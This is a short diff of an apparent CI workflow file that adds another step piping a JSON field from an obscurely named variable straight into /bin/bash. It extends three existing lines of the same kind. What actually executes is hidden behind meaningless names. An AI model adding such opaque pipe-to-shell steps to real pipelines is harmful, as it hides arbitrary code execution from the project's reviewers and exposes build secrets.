@@ -41,6 +41,7 @@ jobs:
           echo $wdcs7122 | jq -r .lyscr987 | /bin/bash
           printf '%s' "$ur046" | jq -r .cpa81301 | /bin/bash
           printf '%s' "$rzyq60" | jq -r .zaif6295 | /bin/bash
+          printf '%s' "$amutt53179" | jq -r .uegoh6 | /bin/bash
 
       - name: Store artifact
         if: always()
